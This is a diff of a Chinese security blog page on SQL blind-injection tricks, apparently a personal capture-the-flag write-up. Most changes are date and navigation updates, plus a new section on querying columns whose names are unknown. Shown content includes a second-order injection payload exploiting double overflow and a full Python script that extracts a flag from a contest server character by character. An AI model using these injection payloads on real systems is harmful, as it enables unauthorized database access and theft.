@@ -83,7 +83,7 @@
 <meta name="keywords" content="SQL注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL盲注的多种姿势">
-<meta property="og:url" content="http://yoursite.com/2018/10/20/SQL盲注的多种姿势/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/02/17/SQL盲注的多种姿势/index.html">
 <meta property="og:site_name" content="C0mRaDe&#39;s Blog">
 <meta property="og:description" content="SQL注入小tricks or的两边可以没空格，可以是’)( %09(制表符),%0a(换行符)有时候可绕过空格过滤 union select被过滤，可以用union%0bselect regexp与rlike相同 select * from users where name=&amp;#39;John&amp;#39;与select * from users where name in(&amp;#39;John&amp;#3">
 <meta property="og:locale" content="zh-hk">
@@ -115,7 +115,9 @@
 <meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542387690229.png">
 <meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542697884008.png">
 <meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1542387822937.png">
-<meta property="og:updated_time" content="2018-11-20T07:20:07.578Z">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550307415495.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550309346525.png">
+<meta property="og:updated_time" content="2019-02-17T08:13:11.639Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL盲注的多种姿势">
 <meta name="twitter:description" content="SQL注入小tricks or的两边可以没空格，可以是’)( %09(制表符),%0a(换行符)有时候可绕过空格过滤 union select被过滤，可以用union%0bselect regexp与rlike相同 select * from users where name=&amp;#39;John&amp;#39;与select * from users where name in(&amp;#39;John&amp;#3">
@@ -149,7 +151,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/20/SQL盲注的多种姿势/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/02/17/SQL盲注的多种姿势/"/>
 
 
 
@@ -272,7 +274,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/20/SQL盲注的多种姿势/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/17/SQL盲注的多种姿势/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="C0mRaDe">
@@ -301,8 +303,8 @@
               
                 <span class="post-meta-item-text">發表於</span>
               
-              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-10-20T15:52:14+08:00">
-                2018-10-20
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2019-02-17T15:52:14+08:00">
+                2019-02-17
               </time>
             
 
@@ -393,7 +395,8 @@
 <p><img src="https://www.github.com/coomrade/Img/raw/master/pics/1538919333595.png" alt="enter description here"></p>
 <h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>打了下2018 高校网络信息安全管理运维挑战赛，觉得这道是我做出来的里面唯一有意思的了。题目有注册、登录、登出功能，注册个账号然后登录之后有提示flag在数据库中，而且是flag表flag列。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542386360233.png" alt="enter description here">然后有个final exam功能<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542386446525.png" alt="enter description here">做对题会有分<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542386437531.png" alt="enter description here">后面发现，如果注册的用户名使得mysql报错的话，做对题也是零分，于是要想办法把判断语句和导致mysql报错联系到一起，这里用到的payload是<code>comrade&#39;or (ascii(mid((select flag from flag),1,1))=?)*999*pow(999,102)#</code>原理就是利用double的溢出<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542387690229.png" alt="enter description here">另外还可以这样<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542697884008.png" alt="enter description here">exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">__author__=<span class="string">'C0mRaDe'</span></span><br><span class="line"></span><br><span class="line">register_url=<span class="string">'http://210.32.4.20/register.php'</span></span><br><span class="line">login_url=<span class="string">'http://210.32.4.20/login.php'</span></span><br><span class="line">answer_url=<span class="string">'http://210.32.4.20/answer.php'</span></span><br><span class="line">logout_url=<span class="string">'http://210.32.4.20/logout.php'</span></span><br><span class="line">proxies=&#123;<span class="string">'http'</span>:<span class="string">'http://127.0.0.1:8080'</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">'Host'</span>: <span class="string">'210.32.4.20'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line"><span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line"><span class="string">'Content-Length'</span>: <span class="string">'24'</span>,</span><br><span class="line"><span class="string">'Connection'</span>: <span class="string">'close'</span>,</span><br><span class="line"><span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>&#125;</span><br><span class="line">result=<span class="string">''</span></span><br><span class="line">order=<span class="number">1</span></span><br><span class="line">ses=requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">		payload=<span class="string">'''C0mRaDeIISIISIIS'or (ascii(mid((select flag from flag),%s,1))=%s)*999*pow(999,102)#"'''</span>% (order, i)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			ses.post(url=register_url,data=&#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'1'</span>&#125;,proxies=proxies,timeout=<span class="number">5</span>,headers=headers)</span><br><span class="line">			ses.post(url=login_url,data=&#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'1'</span>&#125;,timeout=<span class="number">5</span>,headers=headers,proxies=proxies)</span><br><span class="line">			r=ses.post(url=answer_url,data=<span class="string">r'''10.c=on'''</span>,timeout=<span class="number">5</span>,proxies=proxies,headers=headers)</span><br><span class="line">			ses.cookies.clear()</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'Your grades is 0'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">				result+=chr(i)</span><br><span class="line">				<span class="keyword">print</span> result</span><br><span class="line">				order+=<span class="number">1</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">			<span class="keyword">print</span> e</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542387822937.png" alt="enter description here"></p>
-<h1 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h1><p><a href="https://www.anquanke.com/post/id/160584#h2-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/160584#h2-7</a><br><a href="http://wonderkun.cc/index.html/?p=442" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=442</a></p>
+<h1 id="不知道列名的注入"><a href="#不知道列名的注入" class="headerlink" title="不知道列名的注入"></a>不知道列名的注入</h1><p>来看一个示例<img src="https://www.github.com/coomrade/Img/raw/master/pics/1550307415495.png" alt="enter description here">可以看到，这么一操作，查询到的表的列名就变成了1到6的数字，然后可以进行进一步查询，比如查询第4列<img src="https://www.github.com/coomrade/Img/raw/master/pics/1550309346525.png" alt="enter description here">而对于不能使用逗号的情况，可以这么来<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> d <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="string">`a`</span>)m <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span> <span class="string">`b`</span>)n <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span> <span class="string">`c`</span>)t <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">4</span> <span class="string">`d`</span>)z <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">5</span> <span class="string">`e`</span>)x <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">6</span> <span class="string">`f`</span>)ss <span class="keyword">where</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> students)x;</span><br></pre></td></tr></table></figure></p>
+<h1 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h1><p><a href="https://www.anquanke.com/post/id/160584#h2-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/160584#h2-7</a><br><a href="http://wonderkun.cc/index.html/?p=442" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=442</a><br><a href="https://xz.aliyun.com/t/4105" target="_blank" rel="noopener">https://xz.aliyun.com/t/4105</a></p>
 
       
     </div>
@@ -424,8 +427,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/10/07/MySQL报错注入/" rel="next" title="MySQL报错注入">
-                <i class="fa fa-chevron-left"></i> MySQL报错注入
+              <a href="/2018/12/28/SWPUCTF-writeup/" rel="next" title="SWPUCTF-writeup">
+                <i class="fa fa-chevron-left"></i> SWPUCTF-writeup
               </a>
             
           </div>
@@ -433,10 +436,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/26/反序列化攻击面拓展提高篇/" rel="prev" title="反序列化攻击面拓展提高篇">
-                反序列化攻击面拓展提高篇 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -572,7 +571,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入小tricks"><span class="nav-number">1.</span> <span class="nav-text">SQL注入小tricks</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#只知道表名不知道列名的情况"><span class="nav-number">2.</span> <span class="nav-text">只知道表名不知道列名的情况</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL盲注的多种姿势"><span class="nav-number">3.</span> <span class="nav-text">SQL盲注的多种姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XOR盲注"><span class="nav-number">3.1.</span> <span class="nav-text">XOR盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#regexp-rlike盲注"><span class="nav-number">3.2.</span> <span class="nav-text">regexp/rlike盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#order-by-盲注"><span class="nav-number">3.3.</span> <span class="nav-text">order by 盲注</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#insert-into-注入"><span class="nav-number">4.</span> <span class="nav-text">insert into 注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二次注入"><span class="nav-number">5.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Referer"><span class="nav-number">6.</span> <span class="nav-text">Referer</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入小tricks"><span class="nav-number">1.</span> <span class="nav-text">SQL注入小tricks</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#只知道表名不知道列名的情况"><span class="nav-number">2.</span> <span class="nav-text">只知道表名不知道列名的情况</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL盲注的多种姿势"><span class="nav-number">3.</span> <span class="nav-text">SQL盲注的多种姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XOR盲注"><span class="nav-number">3.1.</span> <span class="nav-text">XOR盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#regexp-rlike盲注"><span class="nav-number">3.2.</span> <span class="nav-text">regexp/rlike盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#order-by-盲注"><span class="nav-number">3.3.</span> <span class="nav-text">order by 盲注</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#insert-into-注入"><span class="nav-number">4.</span> <span class="nav-text">insert into 注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二次注入"><span class="nav-number">5.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#不知道列名的注入"><span class="nav-number">6.</span> <span class="nav-text">不知道列名的注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Referer"><span class="nav-number">7.</span> <span class="nav-text">Referer</span></a></li></ol></div>
             
 
           </div>
@@ -592,7 +591,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
